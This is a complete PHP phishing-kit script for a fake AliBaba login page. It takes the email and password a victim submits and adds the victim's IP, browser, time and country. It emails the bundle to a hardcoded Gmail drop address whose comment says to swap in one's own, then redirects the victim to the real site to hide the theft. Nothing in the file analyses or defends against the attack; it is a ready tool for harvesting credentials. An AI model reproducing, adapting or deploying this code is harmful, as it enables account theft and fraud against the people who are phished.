<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------AliBaba Info-----------------------\n";
$message .= "Email            : ".$_POST['formtext3']."\n";
$message .= "Password            : ".$_POST['formtext4']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "---------Created BY fudtool[.]com---------\n";
//Change Ur Email Address Here
$send = "successful.drizzy@gmail.com";
$subject = "Result from $ip";
$headers = "From: AliBaba<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwianZ7TtqXMAhUCWY4KHaAXBbsQFggiMAA&url=http%3A%2F%2Fwww.alibaba.com%2F&usg=AFQjCNG47ZtJbPJhPbtLyjJ0W3YLEMGnjQ&sig2=3cL57jvuK8lnvTi9xUdlow&bvm=bv.119745492,d.c2E");

	 
?>